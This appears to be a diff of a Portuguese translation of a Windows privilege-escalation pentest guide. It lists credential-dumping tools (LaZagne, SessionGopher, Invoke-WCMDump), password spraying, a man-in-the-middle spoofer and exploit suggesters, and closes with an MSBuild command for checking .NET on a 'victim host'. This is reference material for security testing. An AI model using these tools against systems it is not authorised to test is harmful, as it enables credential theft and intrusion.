+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Credential Manager. Detected.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Executa password spray com senhas coletadas no domínio**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é um spoofer ADIDNS/LLMNR/mDNS/NBNS em PowerShell e ferramenta man-in-the-middle.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica para privesc no Windows**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Procura por vulnerabilidades conhecidas de privesc (DESCONTINUADO para Watson)\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Precisa de privilégios de Admin)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades de privesc conhecidas (precisa ser compilado usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host buscando por misconfigurações (mais uma ferramenta de coleta de informação do que privesc) (precisa ser compilado) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades conhecidas de privesc (precisa ser compilado usando o VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando por misconfigurações (mais uma ferramenta de coleta de informações do que privesc) (precisa ser compilado) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de muitos softwares (exe pré-compilado no github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp para C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifica misconfigurações (executável pré-compilado no github). Não recomendado. Não funciona bem no Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis misconfigurações (exe a partir de python). Não recomendado. Não funciona bem no Win10.
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica por misconfigurações (executável pré-compilado no github). Não recomendado. Não funciona bem no Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis misconfigurações (exe gerado a partir de python). Não recomendado. Não funciona bem no Win10.
 
 **Bat**
 
@@ -1642,14 +1646,14 @@ Se você conseguir **hijack uma dll** sendo **loaded** por um **process** execut
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits que funcionam (python local)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits que funcionam (python local)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)
 
 **Meterpreter**
 
 _multi/recon/local_exploit_suggestor_
 
-You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
+You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão do .NET instalada na máquina vítima você pode fazer:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
